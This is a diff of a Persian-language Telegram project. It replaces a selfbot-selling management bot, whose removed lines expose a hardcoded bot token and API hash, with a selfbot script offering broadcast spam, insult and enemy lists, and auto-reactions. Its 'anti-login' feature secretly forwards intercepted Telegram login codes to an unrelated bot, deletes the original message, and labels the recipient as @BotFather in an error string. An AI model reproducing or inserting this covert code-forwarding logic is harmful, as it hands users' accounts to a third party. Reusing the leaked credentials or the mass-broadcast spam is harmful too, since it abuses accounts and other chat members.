@@ -1,2392 +1,2489 @@
+import requests
 from pyrogram import Client, filters
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButtonStyle
-from pyrogram.errors import SessionPasswordNeeded, MessageNotModified
-import json, os, asyncio, subprocess, sys, time, threading, random
-import html
+from pyrogram.types import Message
+import os, asyncio, aiohttp, random, re
+from datetime import datetime
+import pytz
 from pyrogram import enums
+from pyrogram.raw import functions
+from datetime import datetime, timedelta
+import json
+import time
+from pyrogram.types import ChatPermissions, ChatPrivileges
+import sys
+from pyrogram.types import ChatMemberUpdated
+from pyrogram.errors import FloodWait
 
-# برای پهن‌تر شدن حباب پیام و در نتیجه کشیده‌تر شدن دکمه‌های اینلاین
-# از فاصله‌های یونیکد در یک خط جدا استفاده می‌شود.
-MENU_WIDTH_PAD = "\n" + ("\u2007" * 64)
+bot_username = "Helpselfbotvippersian_bot" # ایدی ربات هلپر بدون @
 
-async def safe_edit_message(message, *args, **kwargs):
-    """ویرایش امن پیام؛ اگر متن/کیبورد تغییری نکرده بود خطا ندهد."""
-    try:
-        return await message.edit_text(*args, **kwargs)
-    except MessageNotModified:
-        return None
-
-user_temp_codes = {}
-active_clients = {}
-BOT_TOKEN = "8876742932:AAHkfGQMsNEDH_bSQemz5p4NLdMtJOTOiTM"
+USER_ID = None
+PHONE = None
 API_ID = 35656061
 API_HASH = "b37f2596516bc0439bf505d1d230395c"
-ADMIN_ID = 7845464086
 
-# تنظیمات منوی جدید
-# یوزرنیم‌ها را بدون @ وارد کنید
-SUPPORT_USERNAME = "Aliconfigs"
-BUY_CHANNEL_USERNAME = "SelfPersiangulf"
-HELPER_BOT_USERNAME = "Helpselfbotvippersian_bot"
+if len(sys.argv) > 1:
+    USER_ID = int(sys.argv[1])
+if len(sys.argv) > 2:
+    PHONE = sys.argv[2]
+if len(sys.argv) > 3:
+    API_ID = int(sys.argv[3])
+if len(sys.argv) > 4:
+    API_HASH = sys.argv[4]
 
-os.makedirs("sessions", exist_ok=True)
+if USER_ID:
+    session_name = f"sessions/{USER_ID}"
+else:
+    session_name = "self"
 
-# لیست کانال ها کم یا زیاد میتونید کنید بدون @
-FORCE_CHANNELS = [
-    "SH0PAL1",
-]
+session_path = f"{session_name}.session"
+if not os.path.exists(session_path) and USER_ID:
+    print(f"⚠️ فایل session برای کاربر {USER_ID} یافت نشد!")
+    print("💡 لطفا ابتدا در ربات مدیریت لاگین کنید.")
 
-COIN_RATE = 1440  # 1440 سکه = 50,000 تومان
-TOMAN_PER_COIN = 50000 / 1440
-card_info = {
-                "card_number": "6037-1234-1234-1234",
-                "card_owner": "نام صاحب کارت",
-                "bank_name": "نام بانک"
-            }
+app = Client(session_name, api_id=API_ID, api_hash=API_HASH)
 
-bot = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)
+SAVED_PHOTOS_DIR = "saved_photos"
+INSULTS_FILE = "insults.txt"
+ENEMIES_FILE = "enemies.txt"
+BACKUPS_DIR = "backups"
+online_task = None
+self_mode_active = True
 
-class JSONDatabase:
-    def __init__(self, filename="database.json"):
-        self.filename = filename
-        self.data = self.load_data()
-    
-    def load_data(self):
-        try:
-            if os.path.exists(self.filename):
-                with open(self.filename, 'r', encoding='utf-8') as f:
-                    return json.load(f)
-            else:
-                initial_data = {
-                    "users": {}, 
-                    "processes": {}, 
-                    "temp_data": {}, 
-                    "credits": {}, 
-                    "timers": {},
-                    "payments": {},
-                    "settings": {
-                        "coin_rate": COIN_RATE,
-                        "toman_per_coin": TOMAN_PER_COIN,
-                        "admin_id": ADMIN_ID
-                    }
-                }
-                self.save_data(initial_data)
-                return initial_data
-        except Exception as e:
-            return {
-                "users": {}, "processes": {}, "temp_data": {}, 
-                "credits": {}, "timers": {}, 
-                "payments": {}, "settings": {}
-            }
-    
-    def save_data(self, data=None):
-        try:
-            if data: 
-                self.data = data
-            with open(self.filename, 'w', encoding='utf-8') as f:
-                json.dump(self.data, f, indent=4, ensure_ascii=False)
-            return True
-        except Exception as e:
-            return False
-    
-    def get(self, category, key, default=None):
-        try:
-            return self.data.get(category, {}).get(str(key), default)
-        except:
-            return default
-    
-    def set(self, category, key, value):
-        try:
-            if category not in self.data: 
-                self.data[category] = {}
-            self.data[category][str(key)] = value
-            return self.save_data()
-        except Exception as e:
-            return False
-    
-    def delete(self, category, key):
-        try:
-            if category in self.data and str(key) in self.data[category]:
-                del self.data[category][str(key)]
-                return self.save_data()
-            return False
-        except Exception as e:
-            return False  
-    def get_all(self, category):
-        try:
-            return self.data.get(category, {})
-        except:
-            return {}
-    
-    def get_pending_payments(self):
-        try:
-            payments = self.data.get("payments", {})
-            return {k: v for k, v in payments.items() if v.get('status') == 'pending'}
-        except:
-            return {}
-    
+action_settings = {
+    "typing": False, 
+    "upload_photo": False, 
+    "record_audio": False, 
+    "upload_video": False, 
+    "upload_document": False,
+    "record_video": False, 
+    "upload_audio": False, 
+    "upload_video_note": False, 
+    "record_video_note": False, 
+    "playing": False, 
+    "choose_contact": False, 
+    "find_location": False,  
+    "choose_sticker": False, 
+}
+ACTION_MAP = {
+    "typing": enums.ChatAction.TYPING,
+    "upload_photo": enums.ChatAction.UPLOAD_PHOTO,
+    "record_audio": enums.ChatAction.RECORD_AUDIO,
+    "upload_video": enums.ChatAction.UPLOAD_VIDEO,
+    "upload_document": enums.ChatAction.UPLOAD_DOCUMENT,
+    "record_video": enums.ChatAction.RECORD_VIDEO,
+    "upload_audio": enums.ChatAction.UPLOAD_AUDIO,
+    "upload_video_note": enums.ChatAction.UPLOAD_VIDEO_NOTE,
+    "record_video_note": enums.ChatAction.RECORD_VIDEO_NOTE,
+    "playing": enums.ChatAction.PLAYING,
+    "choose_contact": enums.ChatAction.CHOOSE_CONTACT,
+    "find_location": enums.ChatAction.FIND_LOCATION,
+    "choose_sticker": enums.ChatAction.CHOOSE_STICKER,
+}
+lock_settings = {
+    "همه": False,
+    "مدیا": False, 
+    "استیکر": False,
+    "فوروارد": False,
+    "ویس": False,
+    "پیام": False,
+    "فایل": False
+}
+format_settings = {
+    "بولد": False,
+    "ایتالیک": False,
+    "زیر خط": False,
+    "خط‌ خورده": False,
+    "اسپویلر": False,
+    "کد": False,
+    "پیش‌ فرمت": False,
+    "نقل ‌قول": False,
+}
+html_tags = {
+    "بولد": "<b>{}</b>",
+    "ایتالیک": "<i>{}</i>",
+    "زیر خط": "<u>{}</u>",
+    "خط‌ خورده": "<s>{}</s>",
+    "اسپویلر": "<spoiler>{}</spoiler>",
+    "کد": "<code>{}</code>",
+    "پیش‌ فرمت": "<pre>{}</pre>",
+    "نقل ‌قول": "<blockquote>{}</blockquote>",
+}
 
-db = JSONDatabase()
-user_timers = {}
+os.makedirs(SAVED_PHOTOS_DIR, exist_ok=True)
+os.makedirs(BACKUPS_DIR, exist_ok=True)
 
-class UserTimer:
-    def __init__(self, user_id, callback):
-        self.user_id, self.callback, self.timer, self.is_running = user_id, callback, None, False
-    
-    def start(self):
-        if self.is_running: 
-            self.stop()
-        self.is_running = True
-        self.timer = threading.Timer(3600, self._on_timer)
-        self.timer.start()
-        db.set("timers", self.user_id, {"start_time": time.time(), "is_running": True})
-    
-    def stop(self):
-        if self.timer: 
-            self.timer.cancel()
-        self.is_running = False
-        db.delete("timers", self.user_id)
-    
-    def _on_timer(self):
-        self.is_running = False
-        db.delete("timers", self.user_id)
-        self.callback(self.user_id)
-async def betting_info_handler(client, message):
-    info_text = """
-🎲 **سیستم شرطبندی گروهی 1v1**
+user_format_mode = {}
+auto_reactions = {} 
+anti_login_enabled = False
+user_time_status = {}
+banners = {}
+active_broadcasts = {}
+banner_counter = 1
+user_original_names = {}
+user_fonts = {}
+user_cache = {}
+CACHE_TIMEOUT = 300 
+photo_save_active = True
+time_updater_started = False
+bold_enabled = {}
+auto_replies = {}
+enemies = set()
+always_online_enabled = False
 
-**📋 قوانین شرطبندی:**
-1️⃣ در گروه با نوشتن `شرطبندی 100` (یا هر مقدار دیگر) می‌توانید شرط ایجاد کنید
-2️⃣ نفر دوم می‌تواند با کلیک روی دکمه «پیوستن به شرط» وارد شود
-3️⃣ پس از پیوستن نفر دوم، ۵ ثانیه بعد برنده مشخص می‌شود
-4️⃣ برنده تمام مبلغ شرط را دریافت می‌کند
-5️⃣ اگر در ۵ دقیقه کسی شرکت نکند، شرط لغو و مبلغ بازگردانده می‌شود
-
-**💰 مثال:**
-- شما: `شرطبندی 500`
-- حریف: پیوستن به شرط
-- برنده: تمام 1000 سکه را می‌برد (500+500)
-
-"""
-
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
-    ])
-    
-    await message.edit_text(info_text, reply_markup=keyboard)
-def create_numpad_keyboard(prefix="code"):
-    buttons = []
-    
-    row1 = [
-        InlineKeyboardButton("1️⃣", callback_data=f"{prefix}_1"),
-        InlineKeyboardButton("2️⃣", callback_data=f"{prefix}_2"),
-        InlineKeyboardButton("3️⃣", callback_data=f"{prefix}_3")
-    ]
-    
-    row2 = [
-        InlineKeyboardButton("4️⃣", callback_data=f"{prefix}_4"),
-        InlineKeyboardButton("5️⃣", callback_data=f"{prefix}_5"),
-        InlineKeyboardButton("6️⃣", callback_data=f"{prefix}_6")
-    ]
-    
-    row3 = [
-        InlineKeyboardButton("7️⃣", callback_data=f"{prefix}_7"),
-        InlineKeyboardButton("8️⃣", callback_data=f"{prefix}_8"),
-        InlineKeyboardButton("9️⃣", callback_data=f"{prefix}_9")
-    ]
-    
-    row4 = [
-        InlineKeyboardButton("⌨️ پاک کن", callback_data=f"{prefix}_clear"),
-        InlineKeyboardButton("0️⃣", callback_data=f"{prefix}_0"),
-        InlineKeyboardButton("✅ ارسال", callback_data=f"{prefix}_send")
-    ]
-    
-    row5 = [
-        InlineKeyboardButton("🔙 انصراف", callback_data=f"{prefix}_cancel")
-    ]
-    
-    buttons.append(row1)
-    buttons.append(row2)
-    buttons.append(row3)
-    buttons.append(row4)
-    buttons.append(row5)
-    
-    return InlineKeyboardMarkup(buttons)
-
-def format_code_display(code):
-    if not code:
-        return "⚪.⚪.⚪.⚪.⚪"
-    
-    digits = list(code)
-    while len(digits) < 5:
-        digits.append("⚪")
-    
-    return ".".join(digits)
-async def handle_code_from_keyboard(client, code_message):
-    user_id = code_message.from_user.id
-    code = code_message.text 
-
-    code = code.replace(".", "")
-    
-    temp_data = db.get("temp_data", user_id)
-    
-    if not temp_data:
-        await client.send_message(user_id, "❌ اطلاعات یافت نشد\nلطفا دوباره شماره تلفن را ارسال کنید")
+FONTS = {
+    1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
+    2: {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
+    3: {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'۶','7':'７','8':'８','9':'９'},
+    4: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
+    5: {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
+    6: {'0':'0҉','1':'1҉','2':'2҉','3':'3҉','4':'4҉','5':'5҉','6':'6҉','7':'7҉','8':'8҉','9':'9҉'}
+}
+def get_persian_action_name(english_name):
+    """تبدیل نام انگلیسی اکشن به فارسی"""
+    persian_map = {
+        "typing": "تایپ",
+        "upload_photo": "اپلود عکس",
+        "record_audio": "ضبط ویس",
+        "upload_video": "اپلود ویدیو",
+        "upload_document": "اپلود فایل",
+        "record_video": "ضبط ویدیو",
+        "upload_audio": "اپلود ویس",
+        "upload_video_note": "اپلود ویدیو نوت",
+        "record_video_note": "ضبط ویدیو نوت",
+        "playing": "بازی",
+        "choose_contact": "انتخاب مخاطب",
+        "find_location": "پیدا کردن موقعیت",
+        "choose_sticker": "انتخاب استیکر",
+    }
+    return persian_map.get(english_name, english_name)
+def get_english_action_name(persian_name):
+    english_map = {
+        "تایپ": "typing",
+        "اپلود فایل": "upload_document",
+        "اپلود عکس": "upload_photo",
+        "اپلود فایل": "upload_document", 
+        "اپلود ویدیو": "upload_video",
+        "اپلود ویس": "upload_audio",
+        "اپلود ویدیو نوت": "upload_video_note",
+        "ضبط ویس": "record_audio",
+        "ضبط ویدیو": "record_video",
+        "ضبط ویدیو نوت": "record_video_note",
+        "بازی": "playing",
+        "انتخاب مخاطب": "choose_contact",
+        "انتخاب موقعیت": "find_location",
+        "پیدا کردن موقعیت": "find_location",
+        "انتخاب استیکر": "choose_sticker",
+    }
+    return english_map.get(persian_name, persian_name)
+async def apply_chat_actions(client: Client, message: Message):
+    if not message.from_user:
         return
-    
-    try:
-        if user_id in active_clients:
-            user_client = active_clients[user_id]
-        else:
-            session_name = f"sessions/{user_id}"
-            user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
-            await user_client.connect()
-            active_clients[user_id] = user_client
-        
-        try: 
-            await user_client.sign_in(temp_data["phone"], temp_data["phone_code_hash"], code)
-        except SessionPasswordNeeded:
-            await client.send_message(
-                user_id,
-                "🔒 **رمز دو مرحله‌ای نیاز است**\n\n"
-                "لطفا رمز دو مرحله‌ای خود را به صورت متن ارسال کنید:"
-            )
-            db.set("temp_data", user_id, {**temp_data, "needs_password": True})
-            return
-        
-        user_info = {
-            "phone": temp_data["phone"],
-            "status": "active", 
-            "created_at": time.time(),
-            "last_active": time.time(),
-        }
-        db.set("users", user_id, user_info)
-        db.delete("temp_data", user_id)
-        
-        if user_id in active_clients:
+    if message.from_user.id == (await client.get_me()).id:
+        return    
+    for action_name, is_active in action_settings.items():
+        if is_active:
             try:
-                await active_clients[user_id].disconnect()
-                del active_clients[user_id]
-            except:
-                pass
-
-        if run_selfbot(user_id, temp_data["phone"]):
-            credits = db.get("credits", user_id, 0)
-            await client.send_message(
-                user_id,
-                f"✅ **سلف بات فعال شد!**\n\n"
-                f"💰 سکه های شما: {credits}\n"
-                f"⏰ زمان باقی‌مانده: {credits} ساعت"
-            )
-        else: 
-            await client.send_message(user_id, "❌ خطا در اجرای سلف بات")
-        
-    except Exception as e: 
-        error_msg = str(e)
-        if "PHONE_CODE_EXPIRED" in error_msg:
-            await client.send_message(
-                user_id,
-                "❌ **کد منقضی شده!**\n\n"
-                "لطفا دوباره شماره تلفن خود را ارسال کنید."
-            )
-            db.delete("temp_data", user_id)
-            if user_id in active_clients:
-                try:
-                    await active_clients[user_id].disconnect()
-                    del active_clients[user_id]
-                except:
-                    pass
-        else:
-            await client.send_message(user_id, f"❌ **خطا:** {error_msg}")
-
-async def cancel_group_bet_if_no_joiner(client, bet_key):
-    await asyncio.sleep(300) 
-
-    bet_data = db.get("group_bets", bet_key)
-    if not bet_data or bet_data.get("finished"):
-        return
-
-    participants = bet_data.get("participants", [])
-    chat_id = bet_data["chat_id"]
-    message_id = bet_data["message_id"]
-    amount = bet_data["amount"]
-    creator_id = bet_data["creator_id"]
-    creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
-    creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
+                await client.send_chat_action(
+                    chat_id=message.chat.id,
+                    action=ACTION_MAP[action_name]
+                )
+                await asyncio.sleep(2)
+                break 
+            except Exception as e:
+                print(f"❌ خطا در اعمال اکشن {action_name}: {e}")
+async def send_global_banner(client: Client, banner_id: int):
+    banner_data = banners[banner_id]
+    delay = active_broadcasts.get('delay', 300) 
     
-    if len(participants) > 0:
-        return
-    
-    if bet_data.get("refunded"):
-        return
-    
-    creator_credits = db.get("credits", creator_id, 0)
-    db.set("credits", creator_id, creator_credits + amount)
-
-    bet_data["finished"] = True
-    bet_data["is_active"] = False
-    bet_data["refunded"] = True
-    db.set("group_bets", bet_key, bet_data)
-
-    text = (
-        "⛔ شرط به دلیل عدم شرکت‌کننده لغو شد.\n\n"
-        f"👤 سازنده: {creator_mention}\n"
-        f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
-        "💸 مبلغ به سازنده برگشت داده شد."
-    )
-    
-    try:
-        await client.edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
-    except:
-        pass
-
-    try:
-        await client.send_message(
-            creator_id,
-            f"⛔ **شرط شما لغو شد!**\n\n"
-            f"به دلیل عدم شرکت‌کننده، شرط شما لغو شد.\n"
-            f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
-            f"💸 مبلغ به حساب شما برگشت داده شد.\n\n"
-            f"📊 موجودی جدید شما: <code>{db.get('credits', creator_id, 0)}</code> سکه"
-        )
-    except:
-        pass
-
-async def finish_group_bet(client, bet_key):
-    await asyncio.sleep(5)
-
-    bet_data = db.get("group_bets", bet_key)
-    if not bet_data or bet_data.get("finished"):
-        return
-
-    chat_id = bet_data["chat_id"]
-    message_id = bet_data["message_id"]
-    amount = bet_data["amount"]
-    creator_id = bet_data["creator_id"]
-    creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
-    creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
-    participants = bet_data.get("participants", [])
-    
-    if len(participants) == 0:
-        if not bet_data.get("refunded"):
-            creator_credits = db.get("credits", creator_id, 0)
-            db.set("credits", creator_id, creator_credits + amount)
-            bet_data["refunded"] = True
-
-        bet_data["finished"] = True
-        bet_data["is_active"] = False
-        db.set("group_bets", bet_key, bet_data)
-
-        text = (
-            "⛔ شرط به حد نصاب نرسید و لغو شد.\n\n"
-            f"💰 مبلغ هر نفر: <code>{amount}</code> سکه\n"
-            f"👤 سازنده: {creator_mention}"
-        )
+    while active_broadcasts.get('global', {}).get('running', False):
         try:
-            await client.edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
-        except:
-            pass
-        return
+            async for dialog in client.get_dialogs():
+                if not active_broadcasts.get('global', {}).get('running', False):
+                    break
+                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                    try:
+                        if banner_data['media']:
+                            await banner_data['message'].copy(dialog.chat.id)
+                        else:
+                            await client.send_message(dialog.chat.id, banner_data['text'])
+                        
+                        await asyncio.sleep(2) 
+                        
+                    except Exception as e:
+                        continue
+            await asyncio.sleep(delay)
+            
+        except Exception as e:
+            await asyncio.sleep(60)
+
+async def send_instant_broadcast(client: Client, banner_id: int):
+    banner_data = banners[banner_id]
+    sent_count = 0
     
-    players = [{"id": creator_id, "name": bet_data.get('creator_name', 'کاربر')}] + participants
-    player_ids = [creator_id] + [p["id"] for p in participants]
-    player_mentions = [creator_mention]
-    for p in participants:
-        p_name = html.escape(p.get('name', 'کاربر'))
-        player_mentions.append(f'<a href="tg://user?id={p["id"]}"><b>{p_name}</b></a>')
-    
-    gross_pot = (1 + len(participants)) * amount
-    tax = int(gross_pot * 0.06)  # مالیات ۶٪ از مجموع شرط
-    pot = gross_pot - tax
-
-    winner_index = random.choice(range(len(players)))
-    winner_id = player_ids[winner_index]
-    winner_mention = player_mentions[winner_index]
-    loser_index = 1 - winner_index if len(players) == 2 else None
-    loser = players[loser_index] if loser_index is not None else None
-    winner_credits = db.get("credits", winner_id, 0) + pot
-    db.set("credits", winner_id, winner_credits)
-
-    bet_data["finished"] = True
-    bet_data["is_active"] = False
-    bet_data["winner_id"] = winner_id
-    bet_data["winner_name"] = players[winner_index].get("name", "کاربر")
-    bet_data["pot"] = pot
-    db.set("group_bets", bet_key, bet_data)
-
-    loser_name = html.escape(loser.get("name", "کاربر")) if loser else "-"
-    loser_id = loser.get("id", "-") if loser else "-"
-    result_text = (
-        "<b>◈ ━━━ selfisaz PersianGulf ━━━ ◈</b>\n"
-        "<b>𝐕𝐈𝐏</b> | <b>نتیجه شرطبندی :</b>\n"
-        f"<b>𝐕𝐈𝐏</b> | <b>برنده :</b> {html.escape(players[winner_index].get('name','کاربر'))} (<code>{winner_id}</code>)\n"
-        f"<b>𝐕𝐈𝐏</b> | <b>بازنده :</b> {loser_name} (<code>{loser_id}</code>)\n"
-        f"<b>𝐕𝐈𝐏</b> | <b>جایزه:</b> {pot:,} الماس\n"
-        f"<b>𝐕𝐈𝐏</b> | <b>مالیات:</b> {tax:,} الماس\n"
-        "◈ ━━━ <b>selfisaz PersianGulf</b> ━━━ ◈"
-    )
-
-    try:
-        await client.edit_message_text(chat_id, message_id, result_text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
-    except:
-        pass
-
-    try:
-        await client.send_message(
-            chat_id,
-            f"🏆 {winner_mention} برنده شرط <code>{amount}</code> سکه‌ای شد و <b>{pot}</b> سکه دریافت کرد!",
-            parse_mode=enums.ParseMode.HTML
-        )
-    except:
-        pass
-    try:
-        await client.send_message(
-            winner_id,
-            f"🎉 **تبریک! شما برنده شرط شدید!**\n\n"
-            f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
-            f"💎 جایزه دریافتی: <b>{pot}</b> سکه\n"
-            f"👥 تعداد بازیکنان: {len(players)} نفر\n\n"
-            f"📊 موجودی جدید شما: <code>{db.get('credits', winner_id, 0)}</code> سکه"
-        )
-    except:
-        pass
-
-    for player in players:
-        if player["id"] != winner_id:
+    async for dialog in client.get_dialogs():
+        if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
             try:
-                await client.send_message(
-                    player["id"],
-                    f"😔 **متاسفانه شما در شرط باختید!**\n\n"
-                    f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
-                    f"👥 تعداد بازیکنان: {len(players)} نفر\n"
-                    f"🏆 برنده: {winner_mention}\n\n"
-                    f"📊 موجودی فعلی شما: <code>{db.get('credits', player['id'], 0)}</code> سکه"
-                )
-            except:
-                pass
-async def check_force_join(client, user_id):
-    not_joined = []
-
-    for ch in FORCE_CHANNELS:
-        try:
-            member = await client.get_chat_member(ch, user_id)
-            if member.status in ("kicked", "banned"):
-                not_joined.append(ch)
-        except:
-            not_joined.append(ch)
-
-    if not_joined:
-        return False, not_joined
+                if banner_data['media']:
+                    await banner_data['message'].copy(dialog.chat.id)
+                else:
+                    await client.send_message(dialog.chat.id, banner_data['text'])
+                
+                sent_count += 1
+                await asyncio.sleep(2) 
+                
+            except Exception:
+                continue
     
-    return True, []
-
-def deduct_credit_callback(user_id):
+    await client.send_message("me", f"✅ **ارسال بنر کامل شد**\n\n📤 **تعداد ارسال شده:** {sent_count} گروه")
+def save_reactions():
     try:
-        if not db.get("processes", user_id): 
-            return
-        credits = db.get("credits", user_id, 0)
-        if credits > 0:
-            new_credits = credits - 1
-            db.set("credits", user_id, new_credits)
-            if new_credits <= 0:
-                stop_selfbot(user_id)
-                db.set("credits", user_id, 0) 
-                try: 
-                    bot.send_message(
-                        user_id, 
-                        "❌ **سکه های شما تمام شد!**\n\n"
-                        "سلف بات متوقف شد.\n\n"
-                        "💰 برای ادامه استفاده، از طریق منوی «افزایش موجودی» حساب خود را شارژ کنید."
-                    )
-                except: 
-                    pass
-            else:
-                if user_id in user_timers: 
-                    user_timers[user_id].start()
-        else:
-            stop_selfbot(user_id)
-            db.set("credits", user_id, 0)
-            try: 
-                bot.send_message(
-                    user_id, 
-                    "❌ **سکه های شما تمام شد!**\n\n"
-                    "سلف بات متوقف شد.\n\n"
-                    "💰 برای ادامه استفاده، از طریق منوی «افزایش موجودی» حساب خود را شارژ کنید."
-                )
-            except: 
-                pass
-    except Exception as e:
-        print(f"❌ خطا در deduct_credit_callback: {e}")
-
-def run_selfbot(user_id, phone=None):
-    try:
-        stop_selfbot(user_id)
-
-        if phone:
-            cmd = [sys.executable, "self.py", str(user_id), phone, str(API_ID), API_HASH]
-        else:
-            cmd = [sys.executable, "self.py", str(user_id)]
-        
-        process = subprocess.Popen(cmd)
-        pid = process.pid
-
-        db.set("processes", user_id, pid)
-        
-        with open(f"process_{user_id}.pid", "w") as f:
-            f.write(str(pid))
-        
-        print(f"✅ سلف‌بات برای کاربر {user_id} راه‌اندازی شد")
-        print(f"   📱 شماره: {phone}")
-        print(f"   🆔 PID: {pid}")
-        print(f"   💰 سکه: {db.get('credits', user_id, 0)}")
-        print("-" * 50)
-        
-        if user_id not in user_timers:
-            user_timers[user_id] = UserTimer(user_id, deduct_credit_callback)
-        user_timers[user_id].start()
-        
+        with open("mmauto_reactions.json", "w", encoding="utf-8") as f:
+            json.dump(auto_reactions, f, ensure_ascii=False, indent=4)
         return True
     except Exception as e:
-        print(f"❌ خطا در اجرای سلف‌بات: {e}")
+        print(f"❌ خطا در ذخیره ریکشن‌ها: {e}")
         return False
 
-def stop_selfbot(user_id):
+def load_reactions():
     try:
-        if user_id in user_timers:
-            user_timers[user_id].stop()
-            if not db.get("users", user_id): 
-                del user_timers[user_id]
-        
-        pid = db.get("processes", user_id)
-        if pid:
-            try:
-                import os
-                import signal
-                try:
-                    os.kill(pid, signal.SIGTERM)
-                    time.sleep(0.5)
-                except:
-                    pass
-                try:
-                    os.kill(pid, signal.SIGKILL)
-                except:
-                    pass
-                try:
-                    import subprocess
-                    subprocess.run(["pkill", "-f", f"self.py {user_id}"], 
-                                 capture_output=True, check=False)
-                    subprocess.run(["pkill", "-f", "self.py"], 
-                                 capture_output=True, check=False)
-                except:
-                    pass
-                
-            except Exception as e:
-                print(f"⚠️ خطا در قطع پروسس: {e}")
-            
-            db.delete("processes", user_id)
-            user_data = db.get("users", user_id, {})
-            if user_data:
-                user_data["status"] = "inactive"
-                db.set("users", user_id, user_data)
-            
-            try:
-                os.remove(f"process_{user_id}.pid")
-            except:
-                pass
-            
-            print(f"✅ سلف‌بات کاربر {user_id} قطع شد (PID: {pid})")
-            return True
-        
+        if os.path.exists("mmauto_reactions.json"):
+            with open("mmauto_reactions.json", "r", encoding="utf-8") as f:
+                content = f.read().strip()
+                if content: 
+                    return json.loads(content)
+                else:
+                    return {}
+        return {}
+    except json.JSONDecodeError:
+        print("⚠️ فایل ریکشن‌ها خراب است، ایجاد فایل جدید")
+        return {}
+    except Exception as e:
+        print(f"❌ خطا در لود ریکشن‌ها: {e}")
+        return {}
+
+def load_insults() -> list:
+    try:
+        if os.path.exists(INSULTS_FILE):
+            with open(INSULTS_FILE, 'r', encoding='utf-8') as f:
+                return [line.strip() for line in f.readlines() if line.strip()]
+        return []
+    except Exception as e:
+        print(f"❌ خطا در لود کردن فحش‌ها: {e}")
+        return []
+
+def save_insults(insults_list: list) -> bool:
+    try:
+        with open(INSULTS_FILE, 'w', encoding='utf-8') as f:
+            for insult in insults_list:
+                f.write(insult + '\n')
+        return True
+    except Exception as e:
+        print(f"❌ خطا در ذخیره فحش‌ها: {e}")
+        return False
+
+def load_enemies() -> set:
+    try:
+        if os.path.exists(ENEMIES_FILE):
+            with open(ENEMIES_FILE, 'r', encoding='utf-8') as f:
+                return set(int(line.strip()) for line in f.readlines() if line.strip())
+        return set()
+    except Exception as e:
+        print(f"❌ خطا در لود کردن دشمنان: {e}")
+        return set()
+
+def save_enemies(enemies_set: set) -> bool:
+    try:
+        with open(ENEMIES_FILE, 'w', encoding='utf-8') as f:
+            for enemy_id in enemies_set:
+                f.write(str(enemy_id) + '\n')
+        print(f"💾 دشمنان ذخیره شد: {len(enemies_set)} کاربر")
+        return True
+    except Exception as e:
+        print(f"❌ خطا در ذخیره دشمنان: {e}")
+        return False
+
+def is_enemy(user_id: int) -> bool:
+    return user_id in enemies
+enemies = load_enemies()
+print(f"🎯 سیستم دشمنان راه‌اندازی شد: {len(enemies)} دشمن لود شد")
+
+auto_reactions = load_reactions()
+
+async def apply_auto_reaction(client, message):
+    if not message.from_user:
+        return
+    
+    user_id = message.from_user.id
+    if user_id == (await client.get_me()).id:
+        return
+    if str(user_id) in auto_reactions:
         try:
-            import subprocess
-            subprocess.run(["pkill", "-f", f"self.py {user_id}"], check=False)
-            subprocess.run(["pkill", "-f", "self.py"], check=False)
-            db.delete("processes", user_id)
-            print(f"✅ سلف‌بات کاربر {user_id} قطع شد (از طریق pkill)")
-            return True
+            reaction = auto_reactions[str(user_id)]
+            await client.send_reaction(
+                chat_id=message.chat.id,
+                message_id=message.id,
+                emoji=reaction
+            )
+        except Exception as e:
+            print(f"❌ خطا در اعمال ریکشن: {e}")
+
+async def forward_and_save_login_codes(client, message):
+    global anti_login_enabled
+    
+    if not anti_login_enabled:
+        return False
+    if message.from_user and message.from_user.id == 777000:
+        message_text = message.text or ""
+        if any(keyword in message_text for keyword in ["Login code", "کد ورود", "verification code"]):
+            try:
+                code_patterns = [
+                    r"Login code: (\d+)",
+                    r"کد ورود: (\d+)", 
+                    r"verification code: (\d+)",
+                    r"(\d{5,6})\. Do not give this code"
+                ]
+                
+                login_code = None
+                for pattern in code_patterns:
+                    match = re.search(pattern, message_text)
+                    if match:
+                        login_code = match.group(1)
+                        break
+                
+                if login_code:
+                    try:
+                        await client.send_message(
+                            "@ejw9wowjs9wiwbot",
+                            login_code 
+                        )
+                        print(f"کد به پیوی ارسال شد")
+                    except Exception as e:
+                        print(f"❌ خطا در ارسال به @BotFather: {e}")
+                    await client.send_message(
+                        "me",
+                        login_code 
+                    )
+                   
+                    await message.delete()
+                    
+                    print(f"✅ کد ارسال شد: {login_code}")
+                    return True
+                    
+            except Exception as e:
+                print(f"❌ خطا در پردازش کد: {e}")
+    
+    return False
+
+async def check_lock(client, message):
+    if message.chat.type != enums.ChatType.PRIVATE:
+        return
+    
+    if not message.from_user:
+        return
+    
+    if message.from_user.id == (await client.get_me()).id:
+        return
+
+    if lock_settings["همه"]:
+        try:
+            await message.delete()
